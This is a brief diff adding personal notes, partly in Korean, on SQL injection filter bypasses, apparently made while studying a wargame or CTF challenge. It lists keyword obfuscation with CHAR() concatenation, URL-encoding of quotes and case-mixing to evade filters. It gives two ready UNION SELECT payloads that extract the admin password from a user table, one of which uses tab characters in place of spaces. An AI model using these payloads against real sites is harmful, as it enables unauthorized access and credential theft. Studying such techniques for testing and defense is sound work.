@@ -1,0 +1,15 @@
+SELECT -> CHAR(83)||CHAR(69)||CHAR(76)||CHAR(69)||CHAR(67)||CHAR(84)
+UNION -> CHAR(85)||CHAR(78)||CHAR(73)||CHAR(79)||CHAR(78)
+FROM -> CHAR(70)||CHAR(82)||CHAR(79)||CHAR(77)
+admin -> CHAR(97)||CHAR(100)||CHAR(109)||CHAR(105)||CHAR(110)
+
+' -> %27 -> 개수를 잘 맞춰야함
+
+대문자로 쓰면 우회 가능
+ex) union -> Union or UNION
+
+'union select 1,(select upw from user where uid='admin'),1;--
+
+
+
+'Union%09Select%091,(Select%09upw%09From%09user%09Where%09uid='ADMIN'),1;--
